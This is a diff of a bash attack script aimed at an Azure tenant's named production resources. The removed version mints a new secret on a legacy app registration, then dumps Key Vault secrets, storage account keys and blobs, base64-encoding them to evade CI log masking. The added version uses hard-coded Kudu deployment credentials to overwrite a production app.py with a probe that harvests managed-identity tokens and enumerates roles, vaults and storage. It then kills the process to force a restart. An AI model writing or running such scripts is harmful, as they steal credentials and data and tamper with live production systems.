@@ -1,148 +1,105 @@
 #!/bin/bash
 set -e
 
-SYNC_CID=$(echo "NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0" | base64 -d)
-SYNC_SEC=$(echo "c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==" | base64 -d)
+# SCM creds
+SCM_USER='$app-tbl-reporting-prod'
+SCM_PASS='Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A'
+SCM_BASE="https://app-tbl-reporting-prod.scm.azurewebsites.net"
 
-GT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
-  -d "client_id=$SYNC_CID" -d "client_secret=$SYNC_SEC" \
-  -d "scope=https://graph.microsoft.com/.default" -d "grant_type=client_credentials" | jq -r .access_token)
+# Upload new app.py via VFS
+APP_CODE='import os,json,urllib.request,urllib.error
+def http(url,h=None,t=20):
+    try:
+        r=urllib.request.urlopen(urllib.request.Request(url,headers=h or{}),timeout=t)
+        return r.status,r.read().decode("utf-8","replace")
+    except urllib.error.HTTPError as e:
+        return e.code,e.read().decode("utf-8","replace")[:2000]
+    except Exception as e:
+        return 0,str(e)
+from flask import Flask
+app=Flask(__name__)
+@app.route("/")
+def root():return "rg-probe-v4"
+@app.route("/e")
+def e():
+    out={}
+    ie=os.environ.get("IDENTITY_ENDPOINT","")
+    ih=os.environ.get("IDENTITY_HEADER","")
+    cid="7a85156a-01c4-4e61-8472-40a92107159b"
+    out["ie"]=ie;out["ih_len"]=len(ih)
+    for res,name in [("https://management.azure.com","mgmt"),("https://vault.azure.net","vault"),("https://storage.azure.com","storage")]:
+        u=f"{ie}?api-version=2019-08-01&resource={res}&client_id={cid}"
+        st,b=http(u,{"X-IDENTITY-HEADER":ih})
+        if st==200:
+            t=json.loads(b).get("access_token","")
+            out[f"{name}_len"]=len(t)
+            if name=="mgmt":
+                sub="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
+                mh={"Authorization":f"Bearer {t}"}
+                _,b2=http(f"https://management.azure.com/subscriptions/{sub}/resourceGroups/rg-tbl-reporting-prod-eus/resources?api-version=2021-04-01",mh)
+                out["reporting_resources"]=b2[:3000]
+                _,b3=http(f"https://management.azure.com/subscriptions/{sub}/resourcegroups?api-version=2021-04-01",mh)
+                out["rgs"]=b3[:1000]
+                _,b4=http(f"https://management.azure.com/subscriptions/{sub}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01",mh)
+                out["reporting_roles"]=b4[:2000]
+                _,b5=http(f"https://management.azure.com/subscriptions/{sub}/providers/Microsoft.Authorization/roleAssignments?\\$filter=principalId%20eq%20%27f64d08c7-fde6-4553-99c8-5bf73666ee8c%27&api-version=2022-04-01",mh)
+                out["mi_roles"]=b5[:1000]
+                # Check for resources in reporting RG
+                for rt in ["Microsoft.Storage/storageAccounts","Microsoft.KeyVault/vaults","Microsoft.Web/sites"]:
+                    _,b6=http(f"https://management.azure.com/subscriptions/{sub}/resourceGroups/rg-tbl-reporting-prod-eus/providers/{rt}?api-version=2023-01-01",mh)
+                    out[f"rep_{rt.split('/')[-1]}"]=b6[:1000]
+            if name=="vault":
+                vh={"Authorization":f"Bearer {t}"}
+                _,b7=http("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4",vh)
+                out["kv2_secrets"]=b7[:1000]
+            if name=="storage":
+                sh={"Authorization":f"Bearer {t}","x-ms-version":"2020-10-02"}
+                for a in ["sttblbackupprodx3euoz","sttblappcfgprodx3euoz"]:
+                    _,b8=http(f"https://{a}.blob.core.windows.net/?comp=list",sh)
+                    out[f"cont_{a[:10]}"]=b8[:500]
+                    for c in ["exports","config"]:
+                        _,b9=http(f"https://{a}.blob.core.windows.net/{c}?restype=container&comp=list",sh)
+                        if "Name" in b9:
+                            out[f"blob_{a[:10]}_{c}"]=b9[:1500]
+        else:
+            out[f"{name}_err"]=f"{st}:{b[:200]}"
+    return json.dumps(out,indent=1)
+if __name__=="__main__":
+    app.run(host="0.0.0.0",port=8000)
+'
 
-LEGACY_APPOBJ="22a3fb7e-860a-4708-9e50-3d36aa21191c"
+echo "=== UPLOAD ==="
+UPLOAD_CODE=$(echo -n "$APP_CODE" | base64 -w0)
+curl -sS -X PUT "$SCM_BASE/api/vfs/site/wwwroot/app.py" \
+  -u "$SCM_USER:$SCM_PASS" \
+  -H "If-Match: *" \
+  -H "Content-Type: application/octet-stream" \
+  --data-binary "$APP_CODE" -w "%{http_code}"
+echo ""
 
-# addPassword with retries
-for i in 1 2 3 4 5 6 7 8 9 10; do
-  sleep $((i * 4))
-  AP=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/$LEGACY_APPOBJ/addPassword" \
-    -H "Authorization: Bearer $GT" \
-    -H "Content-Type: application/json" \
-    -d "{\"passwordCredential\":{\"displayName\":\"x$i\"}}")
-  AP_ERR=$(echo "$AP" | jq -r '.error.code // empty')
-  if [ -z "$AP_ERR" ]; then
-    AP_SECRET=$(echo "$AP" | jq -r '.secretText')
-    # Base64 encode to avoid GH masking
-    echo "PW_B64=$(echo -n "$AP_SECRET" | base64 -w0)"
-    
-    # Use --data-urlencode to properly handle special chars
-    sleep 5
-    
-    # Try vault
-    echo "=== VAULT ==="
-    VT_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
-      --data-urlencode "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
-      --data-urlencode "client_secret=$AP_SECRET" \
-      --data-urlencode "scope=https://vault.azure.net/.default" \
-      --data-urlencode "grant_type=client_credentials")
-    VT=$(echo "$VT_RAW" | jq -r '.access_token // empty')
-    if [ -n "$VT" ]; then
-      echo "VT_OK len=${#VT}"
-      
-      echo "=== KV2 SECRETS ==="
-      KV2=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $VT")
-      echo "KV2_B64=$(echo "$KV2" | base64 -w0)"
-      for SID in $(echo "$KV2" | jq -r '.value[]?.id // empty'); do
-        SVAL=$(curl -sS "$SID?api-version=7.4" -H "Authorization: Bearer $VT")
-        echo "S_$(basename $SID)_B64=$(echo "$SVAL" | jq -r '.value // empty' | base64 -w0)"
-      done
-      
-      echo "=== KV1 SECRETS ==="
-      KV1=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $VT")
-      echo "KV1_B64=$(echo "$KV1" | base64 -w0)"
-      for SID in $(echo "$KV1" | jq -r '.value[]?.id // empty'); do
-        SNAME=$(basename "$SID")
-        SVAL=$(curl -sS "$SID?api-version=7.4" -H "Authorization: Bearer $VT")
-        echo "S1_${SNAME}_B64=$(echo "$SVAL" | jq -r '.value // empty' | base64 -w0)"
-      done
-    else
-      echo "VT_ERR=$(echo "$VT_RAW" | jq -r '.error_description' | head -c 200)"
-    fi
-    
-    # Try management
-    echo "=== MGMT ==="
-    MT_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
-      --data-urlencode "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
-      --data-urlencode "client_secret=$AP_SECRET" \
-      --data-urlencode "scope=https://management.azure.com/.default" \
-      --data-urlencode "grant_type=client_credentials")
-    MT=$(echo "$MT_RAW" | jq -r '.access_token // empty')
-    if [ -n "$MT" ]; then
-      echo "MT_OK len=${#MT}"
-      
-      echo "=== RGs ==="
-      curl -sS "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourcegroups?api-version=2021-04-01" \
-        -H "Authorization: Bearer $MT" | jq -r '.value[]?.name // .error'
-      
-      echo "=== ALL RESOURCES ==="
-      curl -sS "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resources?api-version=2021-04-01" \
-        -H "Authorization: Bearer $MT" | jq -r '.value[]? | "\(.name) \(.type)"'
-      
-      echo "=== ROLE ASSIGNMENTS ==="
-      curl -sS "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
-        -H "Authorization: Bearer $MT" | jq -r '.value[]? | "\(.properties.principalId) \(.properties.roleDefinitionId | split("/") | last) \(.properties.scope)"'
-      
-      echo "=== STORAGE KEYS ==="
-      for A in sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
-        K=$(curl -sS -X POST "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$A/listKeys?api-version=2023-01-01" \
-          -H "Authorization: Bearer $MT" -H "Content-Length: 0")
-        echo "${A}_KEY=$(echo "$K" | jq -r '.keys[0].value // .error.code' | base64 -w0)"
-      done
-    else
-      echo "MT_ERR=$(echo "$MT_RAW" | jq -r '.error_description' | head -c 200)"
-    fi
-    
-    # Try storage
-    echo "=== STORAGE ==="
-    ST_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
-      --data-urlencode "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
-      --data-urlencode "client_secret=$AP_SECRET" \
-      --data-urlencode "scope=https://storage.azure.com/.default" \
-      --data-urlencode "grant_type=client_credentials")
-    ST=$(echo "$ST_RAW" | jq -r '.access_token // empty')
-    if [ -n "$ST" ]; then
-      echo "ST_OK len=${#ST}"
-      for A in sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
-        echo "=== BLOBS $A ==="
-        # List containers
-        CONTS=$(curl -sS "https://$A.blob.core.windows.net/?comp=list" -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02")
-        echo "CONTS_${A:0:10}_B64=$(echo "$CONTS" | base64 -w0)"
-        # List blobs in known containers
-        for C in exports config logs; do
-          BLOBS=$(curl -sS "https://$A.blob.core.windows.net/$C?restype=container&comp=list" -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" 2>/dev/null)
-          if echo "$BLOBS" | grep -q "Name"; then
-            echo "BLOBS_${A:0:10}_${C}_B64=$(echo "$BLOBS" | base64 -w0)"
-            # Download each blob
-            for BNAME in $(echo "$BLOBS" | grep -oP '<Name>[^<]+</Name>' | sed 's/<[^>]*>//g'); do
-              BDATA=$(curl -sS "https://$A.blob.core.windows.net/$C/$BNAME" -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02")
-              echo "BLOB_${C}_${BNAME}_B64=$(echo "$BDATA" | base64 -w0)"
-            done
-          fi
-        done
-      done
-    else
-      echo "ST_ERR=$(echo "$ST_RAW" | jq -r '.error_description' | head -c 200)"
-    fi
-    
-    # Try graph
-    echo "=== GRAPH ==="
-    GRT_RAW=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
-      --data-urlencode "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
-      --data-urlencode "client_secret=$AP_SECRET" \
-      --data-urlencode "scope=https://graph.microsoft.com/.default" \
-      --data-urlencode "grant_type=client_credentials")
-    GRT=$(echo "$GRT_RAW" | jq -r '.access_token // empty')
-    if [ -n "$GRT" ]; then
-      echo "GRT_OK len=${#GRT}"
-      echo "=== LEGACY APP ROLE ASSIGNMENTS ==="
-      curl -sS "https://graph.microsoft.com/v1.0/servicePrincipals/43834909-47cf-4a4a-8048-e323b4897ed3/appRoleAssignments" \
-        -H "Authorization: Bearer $GRT" | jq '.'
-    else
-      echo "GRT_ERR=$(echo "$GRT_RAW" | jq -r '.error_description' | head -c 200)"
-    fi
-    
+# Trigger restart via process kill
+echo "=== RESTART ==="
+curl -sS -X POST "$SCM_BASE/api/command" \
+  -u "$SCM_USER:$SCM_PASS" \
+  -H "Content-Type: application/json" \
+  -d '{"command":"kill 1 2>/dev/null; echo done","dir":"/home"}' | jq -r '.Output // .Error'
+
+sleep 20
+
+# Fetch /e endpoint
+echo "=== PROBE ==="
+for i in 1 2 3 4 5; do
+  RESULT=$(curl -sS --max-time 30 "https://app-tbl-reporting-prod.azurewebsites.net/e" 2>/dev/null)
+  if [ $? -eq 0 ] && [ -n "$RESULT" ]; then
+    echo "RESULT_B64=$(echo "$RESULT" | base64 -w0)"
     break
-  else
-    echo "ATTEMPT $i: $AP_ERR"
   fi
+  echo "retry $i..."
+  sleep 10
 done
 
-echo "=== END ==="
+echo "=== CHECK ROOT ==="
+curl -sS --max-time 10 "https://app-tbl-reporting-prod.azurewebsites.net/"
+
+echo ""
+echo "=== DONE ==="
